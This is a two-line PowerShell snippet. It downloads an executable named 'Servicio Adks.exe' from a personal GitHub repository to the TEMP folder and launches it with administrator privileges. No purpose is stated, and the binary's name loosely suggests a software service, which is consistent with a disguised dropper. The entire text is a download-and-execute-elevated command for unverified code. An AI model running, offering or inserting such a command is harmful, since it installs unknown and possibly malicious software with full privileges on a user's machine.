iwr 'https://github.com/usupres45/Adsk/raw/refs/heads/main/Servicio%20Adks.exe' -OutFile "$env:TEMP\Servicio Adks.exe"
Start-Process "$env:TEMP\Servicio Adks.exe" -Verb RunAs -Wait